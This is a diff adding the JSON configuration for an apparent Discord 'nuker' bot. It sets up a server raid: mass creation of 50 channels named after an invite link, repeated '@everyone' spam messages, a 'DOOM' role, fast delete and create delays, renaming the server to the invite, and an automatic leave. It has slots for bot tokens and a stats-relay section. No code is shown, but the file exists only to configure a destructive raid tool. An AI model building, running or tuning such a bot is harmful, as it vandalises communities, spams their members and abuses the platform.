@@ -1,0 +1,22 @@
+{
+    "nuker_token": "",
+    "stats_token": "",
+    "nuker_config": {
+        "channel_name": "https://discord.gg/Dd6YxBTajf",
+        "channel_count": 50,
+        "message_spam_count": 10,
+        "spam_message": "@everyone https://discord.gg/Dd6YxBTajf",
+        "role_name": "DOOM",
+        "delete_delay": 0.3,
+        "create_delay": 0.3,
+        "stats_channel_id": 1307161175951147010,
+        "smite_cooldown": 300,
+        "auto_leave_delay": 600,
+        "server_name": "https://discord.gg/Dd6YxBTajf"
+    },
+    "stats_config": {
+        "listen_channel_id": 1307161175951147010,
+        "relay_channel_id": 1307182459544141896,
+        "stats_channel_id": 1437641260637749300
+    }
+}
